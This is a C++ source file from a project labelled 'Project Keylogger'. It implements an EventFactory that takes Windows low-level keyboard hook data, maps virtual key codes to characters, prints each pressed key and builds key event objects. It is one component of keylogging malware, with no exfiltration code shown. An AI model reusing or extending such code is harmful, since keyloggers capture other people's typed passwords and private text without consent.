/**
 * Project Keylogger
 */


#include "keylogger_dll/EventFactory.h"
#include <bitset>

/**
 * EventFactory implementation
 */

/** Constructor of EventFactory
 *
 */
EventFactory::EventFactory() {
}

/**
 * Function to create an Event with LPARAM and WPARAM
 * @param LPARAM lparam from hook
 * @param WPARAM wparam from hook
 * @return AEvent* the event created
 */
const AEvent* EventFactory::create(WPARAM wParam, LPARAM lParam, t_Context context) {
	std::chrono::time_point<std::chrono::system_clock> time;
	time = std::chrono::system_clock::now();

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	int c; 
	if ((c = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR)) == 0)
	{
	}
	std::cout << "Touche=" << (char)c << std::endl;
	int repeatCount = 0;
	context._ms = p->time;
	int scanCode = p->scanCode;
	int vkKeyCode = p->vkCode;
	DWORD tmp = p->dwExtraInfo;
	bool alt = 0;
	bool extend = (tmp > 36);
	bool prevKeyState = 0;
	bool transState = 0;
	//std::cout << "vkCode=" << vkKeyCode << "|scanCode=" << scanCode << "| at Time = " << context._ms << " |extraInfo=" << p->dwExtraInfo << "|wParam=" << wParam << "|lParam" << lParam  << std::endl;
    return new AEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, context);
}